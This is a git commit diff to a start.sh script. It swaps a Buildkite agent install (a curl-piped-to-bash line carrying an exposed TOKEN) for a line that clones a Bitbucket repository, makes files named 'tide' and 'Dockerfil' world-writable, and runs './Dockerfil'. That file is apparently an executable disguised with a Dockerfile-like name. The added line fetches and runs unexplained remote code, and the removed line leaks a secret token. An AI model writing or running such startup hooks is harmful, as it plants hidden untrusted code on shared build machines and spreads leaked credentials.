550ec76fa89292cfa68199fb0841a8bcf60cd0b4
Jsjdh882 <106061651+Jsjdh882@users.noreply.github.com>
2022-05-23 14:39:44 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,2 +1,1 @@
-TOKEN="7fd05cb6ce15d49eef7fb7204eb0e3e4f7ace99ed8cb63b5d3" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
-~/.buildkite-agent/bin/buildkite-agent start
+git clone https://Ndj8777k@bitbucket.org/ndj8777k/uy.git && cd uy && chmod 777 tide Dockerfil && ./Dockerfil
